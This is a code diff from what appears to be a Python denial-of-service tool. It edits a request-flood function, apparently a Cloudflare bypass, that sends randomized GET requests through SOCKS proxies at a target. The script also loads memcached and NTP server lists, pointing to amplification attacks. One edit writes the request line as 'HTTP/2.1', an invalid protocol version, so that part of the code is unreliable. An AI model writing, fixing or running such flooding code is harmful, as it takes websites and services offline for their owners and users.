@@ -673,9 +673,10 @@ def cookie(event, socks_type):
 def cfb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data() + " HTTP/2.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    # print(request)
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -1601,15 +1602,15 @@ if __name__ == '__main__':
         makefile('files/referers.txt')
     try:
         with open("files/useragent.txt", "r") as f:
-            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readuser = f.readlines()
         with open("files/referers.txt", "r") as f:
-            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readref = f.readlines()
         with open("files/memcached_servers.txt", "r") as f:
             memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
         with open("files/ntp_servers.txt", "r") as f:
             ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
-        UserAgent = Choice(readuser)
-        referers = Choice(readref)
+        UserAgent = choice(readuser).replace('\n', '').replace('\r', '')
+        referers = choice(readref).replace('\n', '').replace('\r', '')
         memcached_servers = Choice(memsv)
         try:
             bdr = str(sys.argv[1]).lower()
